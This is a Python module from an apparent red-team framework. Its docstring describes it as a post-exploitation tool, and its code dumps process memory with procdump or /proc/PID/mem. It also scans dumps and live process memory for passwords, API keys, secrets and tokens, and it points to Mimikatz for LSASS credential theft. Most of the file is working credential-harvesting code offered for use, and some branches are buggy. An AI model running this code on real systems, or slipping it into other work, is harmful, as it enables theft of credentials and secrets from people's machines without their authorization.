"""
Memory Operations Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The Memory Operations module performs memory dumping, analysis, and manipulation. This module
is essential for credential extraction, process analysis, and advanced post-exploitation.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.memory_operations import MemoryOperations
    
    # Initialize logger and module
    logger = FrameworkLogger("memory_ops")
    memory = MemoryOperations(logger)
    
    # Dump process memory
    dump_result = memory.dump_process_memory(process_id=1234)
    print(f"Memory dumped: {dump_result['success']}")
    
    # Extract credentials from memory
    creds = memory.extract_credentials_from_memory(process_name="lsass.exe")
    print(f"Credentials found: {creds['credentials']}")
    
    # Analyze memory dump
    analysis = memory.analyze_memory_dump("/path/to/dump.raw")
    print(f"Findings: {analysis['findings']}")
    
    # Search for patterns in memory
    patterns = memory.search_memory_patterns(process_id=1234, patterns=["password", "api_key"])
    print(f"Patterns found: {patterns['matches']}")

Red Team Use Cases:
- Process memory dumping
- Credential extraction from memory
- Memory pattern searching
- Process analysis
- DLL injection detection
- Memory forensics
- LSASS dumping (Windows)
- SSH key extraction
"""

from typing import Dict, List, Optional
import time
import os
import subprocess
import platform
import re
from pathlib import Path
from utils.logger import FrameworkLogger


class MemoryOperations:
    """Memory operations module"""
    
    def __init__(self, logger: FrameworkLogger):
        """
        Initialize memory operations module
        
        Args:
            logger: Logger instance
        """
        self.logger = logger
        self.memory_dumps = []
        self.extracted_data = []
    
    def dump_process_memory(self, process_id: Optional[int] = None,
                           process_name: Optional[str] = None,
                           output_path: Optional[str] = None) -> Dict:
        """
        Dump process memory
        
        Args:
            process_id: Process ID to dump
            process_name: Process name to dump
            output_path: Output path for dump file
        
        Returns:
            Dictionary containing dump results
        """
        self.logger.info(f"Dumping process memory: PID={process_id}, Name={process_name}")
        
        results = {
            "process_id": process_id,
            "process_name": process_name,
            "output_path": output_path,
            "success": False,
            "size": 0,
            "timestamp": time.time()
        }
        
        try:
            if platform.system() == "Windows":
                # Windows memory dumping
                if process_name == "lsass.exe":
                    # Use Mimikatz or similar for LSASS
                    results["note"] = "LSASS dumping requires Mimikatz or similar tool"
                else:
                    # Use procdump or similar
                    if output_path is None:
                        output_path = f"memory_dump_{process_id}.dmp"
                    
                    cmd = f'procdump -ma {process_id} {output_path}'
                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
                    
                    if result.returncode == 0 and os.path.exists(output_path):
                        results["success"] = True
                        results["output_path"] = output_path
                        results["size"] = os.path.getsize(output_path)
            else:
                # Linux memory dumping
                if process_id:
                    if output_path is None:
                        output_path = f"/tmp/memory_dump_{process_id}.raw"
                    
                    # Use gdb or /proc/PID/mem
                    try:
                        proc_mem_path = f"/proc/{process_id}/mem"
                        if os.path.exists(proc_mem_path):
                            # Read memory maps
                            maps_path = f"/proc/{process_id}/maps"
                            with open(maps_path, 'r') as f:
                                maps = f.read()
                            
                            # Dump memory regions
                            with open(output_path, 'wb') as dump_file:
                                for line in maps.split('\n'):
                                    if line.strip():
                                        parts = line.split()
                                        if len(parts) >= 2:
                                            addr_range = parts[0]
                                            start, end = addr_range.split('-')
                                            start_addr = int(start, 16)
                                            end_addr = int(end, 16)
                                            
                                            try:
                                                with open(proc_mem_path, 'rb') as mem_file:
                                                    mem_file.seek(start_addr)
                                                    data = mem_file.read(end_addr - start_addr)
                                                    dump_file.write(data)
                                            except Exception:
                                                pass
                            
                            results["success"] = True
                            results["output_path"] = output_path
                            if os.path.exists(output_path):
                                results["size"] = os.path.getsize(output_path)
                    except Exception as e:
                        self.logger.error(f"Memory dump failed: {e}")
                        results["error"] = str(e)
                        
        except Exception as e:
            self.logger.error(f"Process memory dump failed: {e}")
            results["error"] = str(e)
        
        if results["success"]:
            self.memory_dumps.append(results)
        
        return results
    
    def extract_credentials_from_memory(self, process_name: str = "lsass.exe") -> Dict:
        """
        Extract credentials from memory
        
        Args:
            process_name: Process name to extract from
        
        Returns:
            Dictionary containing extracted credentials
        """
        self.logger.info(f"Extracting credentials from {process_name}")
        
        results = {
            "process_name": process_name,
            "credentials": [],
            "timestamp": time.time()
        }
        
        try:
            if platform.system() == "Windows":
                if process_name.lower() == "lsass.exe":
                    # LSASS credential extraction requires Mimikatz
                    results["note"] = "LSASS credential extraction requires Mimikatz"
                    # Placeholder for actual extraction
                    results["credentials"] = []
                else:
                    # Search for password patterns in memory
                    dump_result = self.dump_process_memory(process_name=process_name)
                    if dump_result["success"]:
                        patterns = self.search_memory_patterns(
                            dump_file=dump_result["output_path"],
                            patterns=["password", "pwd", "passwd"]
                        )
                        results["credentials"] = patterns["matches"]
            else:
                # Linux credential extraction
                # Search for passwords in process memory
                patterns = self.search_memory_patterns(
                    process_name=process_name,
                    patterns=["password", "passwd", "PASSWORD"]
                )
                results["credentials"] = patterns["matches"]
                
        except Exception as e:
            self.logger.error(f"Credential extraction failed: {e}")
            results["error"] = str(e)
        
        if results["credentials"]:
            self.extracted_data.append(results)
        
        return results
    
    def search_memory_patterns(self, process_id: Optional[int] = None,
                               process_name: Optional[str] = None,
                               dump_file: Optional[str] = None,
                               patterns: Optional[List[str]] = None) -> Dict:
        """
        Search for patterns in memory
        
        Args:
            process_id: Process ID to search
            process_name: Process name to search
            dump_file: Memory dump file to search
            patterns: Patterns to search for
        
        Returns:
            Dictionary containing search results
        """
        self.logger.info("Searching memory for patterns")
        
        if patterns is None:
            patterns = ["password", "api_key", "secret", "token", "credential"]
        
        results = {
            "process_id": process_id,
            "process_name": process_name,
            "dump_file": dump_file,
            "patterns_searched": patterns,
            "matches": [],
            "timestamp": time.time()
        }
        
        try:
            if dump_file and os.path.exists(dump_file):
                # Search in dump file
                with open(dump_file, 'rb') as f:
                    data = f.read()
                    
                    for pattern in patterns:
                        # Search for pattern
                        pattern_bytes = pattern.encode('utf-8', errors='ignore')
                        matches = []
                        
                        start = 0
                        while True:
                            pos = data.find(pattern_bytes, start)
                            if pos == -1:
                                break
                            
                            # Extract context around match
                            context_start = max(0, pos - 50)
                            context_end = min(len(data), pos + len(pattern_bytes) + 50)
                            context = data[context_start:context_end].decode('utf-8', errors='ignore')
                            
                            matches.append({
                                "pattern": pattern,
                                "offset": pos,
                                "context": context
                            })
                            
                            start = pos + 1
                        
                        results["matches"].extend(matches)
                        
            elif process_id or process_name:
                # Search in live process memory
                if platform.system() == "Linux":
                    try:
                        proc_mem_path = f"/proc/{process_id}/mem"
                        if os.path.exists(proc_mem_path):
                            maps_path = f"/proc/{process_id}/maps"
                            with open(maps_path, 'r') as f:
                                maps = f.read()
                            
                            for line in maps.split('\n'):
                                if 'r' in line:  # Readable region
                                    parts = line.split()
                                    if len(parts) >= 2:
                                        addr_range = parts[0]
                                        start, end = addr_range.split('-')
                                        start_addr = int(start, 16)
                                        end_addr = int(end, 16)
                                        
                                        try:
                                            with open(proc_mem_path, 'rb') as mem_file:
                                                mem_file.seek(start_addr)
                                                data = mem_file.read(min(1024*1024, end_addr - start_addr))
                                                
                                                for pattern in patterns:
                                                    pattern_bytes = pattern.encode('utf-8', errors='ignore')
                                                    if pattern_bytes in data:
                                                        results["matches"].append({
                                                            "pattern": pattern,
                                                            "address": hex(start_addr)
                                                        })
                                        except Exception:
                                            pass
                    except Exception as e:
                        self.logger.debug(f"Pattern search failed: {e}")
                        
        except Exception as e:
            self.logger.error(f"Memory pattern search failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def analyze_memory_dump(self, dump_file: str) -> Dict:
        """
        Analyze memory dump
        
        Args:
            dump_file: Path to memory dump file
        
        Returns:
            Dictionary containing analysis results
        """
        self.logger.info(f"Analyzing memory dump: {dump_file}")
        
        results = {
            "dump_file": dump_file,
            "findings": [],
            "suspicious_activity": [],
            "timestamp": time.time()
        }
        
        try:
            if os.path.exists(dump_file):
                file_size = os.path.getsize(dump_file)
                results["file_size"] = file_size
                
                # Basic analysis
                # Search for common indicators
                patterns = self.search_memory_patterns(
                    dump_file=dump_file,
                    patterns=["password", "cmd", "powershell", "mimikatz", "lsass"]
                )
                
                results["findings"] = patterns["matches"]
                
                # Check for suspicious patterns
                suspicious_patterns = ["mimikatz", "lsass", "dumpert", "sekurlsa"]
                for pattern in suspicious_patterns:
                    if any(p["pattern"] == pattern for p in patterns["matches"]):
                        results["suspicious_activity"].append(pattern)
                        
        except Exception as e:
            self.logger.error(f"Memory dump analysis failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def get_memory_dumps(self) -> List[Dict]:
        """Get all memory dumps"""
        return self.memory_dumps
    
    def get_extracted_data(self) -> List[Dict]:
        """Get all extracted data"""
        return self.extracted_data

